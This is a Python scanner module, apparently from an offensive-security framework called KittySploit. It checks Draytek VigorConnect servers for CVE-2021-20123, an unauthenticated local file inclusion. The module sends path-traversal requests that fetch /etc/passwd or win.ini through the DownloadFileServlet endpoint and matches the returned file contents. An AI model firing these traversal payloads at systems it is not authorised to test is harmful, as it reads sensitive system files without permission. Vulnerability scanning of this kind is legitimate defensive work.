#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Draytek VigorConnect 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Draytek VigorConnect 1.6.0-B - Local File Inclusion Detection',
        'description': 'Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion in the file download functionality of the DownloadFileServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'draytek', 'lfi', 'vigorconnect', 'tenable', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.tenable.com/security/research/tra-2021-42',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-20123',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-20123',
    }

    def run(self):
        for path in ('/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything', '/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            header_any = ('application/octet-stream',)
            body_regexes = ('root:.*:0:0:', 'for 16-bit app support',)
            if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Draytek VigorConnect 1.6.0-B - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

